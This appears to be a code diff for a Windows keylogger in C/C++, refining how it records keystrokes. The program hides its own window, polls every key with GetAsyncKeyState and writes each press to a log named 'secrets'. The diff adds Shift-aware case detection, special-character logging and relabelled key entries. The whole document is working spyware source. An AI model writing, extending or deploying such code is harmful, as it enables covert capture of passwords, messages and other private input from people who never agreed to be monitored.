@@ -8,12 +8,10 @@
  * 0x3A - 0x40 : unassigned
  * VK_A - VK_Z are the same as ASCII 'A' - 'Z' (0x41 - 0x5A)
  */
-const char VK_0 = '0';
-const char VK_9 = '9';
+const char VK_0 = '0'; 
+const char VK_9 = '9'; 
 const char VK_A = 'A';
 const char VK_Z = 'Z';
-const int VK_a = 97;
-const int VK_z = 122;
 const char VK_ENTER = '\n';
 
 void hideAppWindow()
@@ -33,21 +31,39 @@ int main()
 		Sleep(0);
 		for (keyPressed = 0; keyPressed < 128; keyPressed++)
 		{
+			/*
+			* If GetAsyncKeyState returns a value of 0 it means the button is up and -32768 means its down.
+			*/
 			if (GetAsyncKeyState(keyPressed) == -32767)
 			{
-				if (keyPressed >= '0' && keyPressed <= '9')
+				if (keyPressed >= VK_0 && keyPressed <= VK_9)
 				{
 					secrets << "Numeric symbol: " << keyPressed << "\n";
 				}
 
 				if (keyPressed >= VK_A && keyPressed <= VK_Z)
 				{
-					secrets << "Upper case: " << keyPressed << "\n";
+					if (!GetAsyncKeyState(VK_SHIFT)) {
+						keyPressed += 32;
+						secrets << "Lower case: " << keyPressed << "\n";
+					} else {
+						secrets << "Upper case: " << keyPressed << "\n";
+					}
 				}
 
-				if (keyPressed >= VK_a && keyPressed <= VK_z)
+				/*
+				* Special characters in ASCII Table: 
+				* 	from 33 to 47
+				*	from 58 to 64
+				*	from 91 to 96
+				*	from 123 to 126  
+				*/
+				if (keyPressed >= 33 && keyPressed <= 47 
+					|| keyPressed >= 58 && keyPressed <= 64 
+					|| keyPressed >= 91 && keyPressed <= 96 
+					|| keyPressed >= 123 && keyPressed <= 126)
 				{
-					secrets << "Lower case: " << keyPressed << "\n";
+					secrets << "Special character: " << keyPressed << "\n";
 				}
 
 				if (keyPressed == VK_TAB)
@@ -57,7 +73,7 @@ int main()
 
 				if (keyPressed == VK_DELETE)
 				{
-					secrets << "### DEL \n";
+					secrets << "### DELETE \n";
 				}
 
 				if (keyPressed == VK_ESCAPE)
@@ -65,7 +81,7 @@ int main()
 					secrets << "### ESCAPE \n";
 				}
 
-				if (keyPressed == '\n')
+				if (keyPressed == VK_ENTER)
 				{
 					secrets << "### ENTER \n";
 				}
@@ -74,11 +90,6 @@ int main()
 				
 				{
 					secrets << "### CAPS LOCK \n";
-				}
-
-				if (keyPressed == VK_SHIFT)
-				{
-					secrets << "### SHIFT \n";
 				}
 
 				if (keyPressed == VK_LEFT)
@@ -101,20 +112,6 @@ int main()
 					secrets << "### DOWN ARROW \n";
 				}
 
-				/*
-				* Special characters in ASCII Table: 
-				* 	from 33 to 47
-				*	from 58 to 64
-				*	from 91 to 96
-				*	from 123 to 126  
-				*/
-
-				if (keyPressed >= 33 && keyPressed <= 47 || keyPressed >= 58 && keyPressed <= 64 || keyPressed >= 91 && keyPressed <= 96 || keyPressed >= 123 && keyPressed <= 126)
-				{
-					secrets << "Special character: " << keyPressed << "\n";
-				}
-
-				// secrets << keyPressed;
 				secrets.flush();
 			}
 		}
